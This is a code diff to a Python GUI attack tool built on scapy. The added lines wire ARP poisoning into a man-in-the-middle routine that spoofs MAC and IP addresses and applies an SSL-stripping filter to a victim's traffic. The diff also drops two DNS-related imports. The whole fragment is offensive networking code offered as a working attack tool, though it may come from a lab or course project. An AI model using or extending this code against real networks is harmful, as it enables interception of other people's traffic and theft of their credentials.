@@ -5,8 +5,6 @@ import uuid
 import threading
 import Dns_spoofing
 import scapy.all as sc
-from DNSDomainTracker import DNSDomainTracker
-from DomainRedirectFilter import DomainRedirectFilter
 from mitm_handler import MitmHandler
 from SSLFilter import SSLStripFilter
 import subprocess
@@ -278,6 +276,11 @@ class AttackGUI:
                 victim = self.mitm_victim_entry.get().strip() or None
                 server_ip = self.mitm_server_entry.get().strip() or None
                 use_ssl = self.ssl_var.get()
+                
+                # Fetch spoofing details from the hidden/shared entries or re-fetch
+                spoof_mac = self.spoof_entry.get().strip()
+                spoof_ip = self.spoof_ip_entry.get().strip()
+                spoof_ip_v6 = self.spoof_ipv6_entry.get().strip()
 
                 self.log("Starting MITM attack:")
                 self.log(f"  Victim IP:  {victim}")
@@ -286,6 +289,11 @@ class AttackGUI:
 
                 ssl_stripper = SSLStripFilter(victim, self.log)
                 mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim, spoof_mac, spoof_ip, spoof_ip_v6, self.log)
+                
+                # Also start ARP Poisoning for MITM to work!
+                spoofer = ARPPoisoner(sc.conf.iface, victim, server_ip, spoof_mac, self.log)
+                spoofer.start()
+                
                 mitm_handler.add_filter(ssl_stripper.__call__)
                 mitm_handler.start()
 
